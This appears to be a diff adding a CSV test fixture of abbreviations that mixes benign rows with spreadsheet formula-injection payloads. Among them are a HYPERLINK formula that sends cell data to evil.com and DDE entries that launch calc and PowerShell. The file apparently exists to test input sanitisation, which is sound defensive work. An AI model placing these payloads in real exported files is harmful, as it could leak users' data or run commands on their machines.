@@ -1,0 +1,8 @@
+abbreviation,fullForm
+SAFE,Safe and standard abbreviation
+=HYPERLINK("http://evil.com/leak?data="&A1,"Click Me!"),Hyperlink Data Exfiltration Vector
++cmd|' /C calc'!A0,DDE Command Execution Macro
+-safe-abbrev,This should pass safely
+@user_handle,This should pass safely
+=SUM(1+1),Basic formula injection
+=cmd|' /C powershell'!A0,PowerShell DDE attack
